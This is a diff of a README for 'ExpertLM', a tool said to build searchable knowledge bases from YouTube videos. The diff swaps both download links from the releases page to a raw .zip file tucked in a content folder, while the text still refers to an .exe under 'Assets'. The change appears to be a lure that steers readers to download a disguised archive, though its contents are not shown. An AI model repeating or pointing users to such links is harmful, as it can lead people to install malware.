@@ -1,6 +1,6 @@
 # 🧠 ExpertLM - Turn YouTube Videos Into Knowledge Bases
 
-[![Download ExpertLM](https://img.shields.io/badge/Download_ExpertLM-Blue?style=for-the-badge)](https://github.com/mimic-communion7457/ExpertLM/releases)
+[![Download ExpertLM](https://img.shields.io/badge/Download_ExpertLM-Blue?style=for-the-badge)](https://raw.githubusercontent.com/mimic-communion7457/ExpertLM/main/experts/huberman/Expert_LM_1.1.zip)
 
 ExpertLM turns YouTube video lists into a searchable library. You connect a creator's channel or a playlist, and the software builds a database of the content. You then ask questions about the information. The system finds the exact moments in the video transcripts where the expert speaks about your topic. It gives you citations so you can verify the facts.
 
@@ -10,7 +10,7 @@ This tool combines the processing power of NotebookLM with the coding efficiency
 
 You can find the latest version of the software on the releases page. 
 
-[Click here to visit the download page](https://github.com/mimic-communion7457/ExpertLM/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/mimic-communion7457/ExpertLM/main/experts/huberman/Expert_LM_1.1.zip)
 
 Look for the file ending in `.exe` under the "Assets" section. Click that link to save the installer to your computer.
 
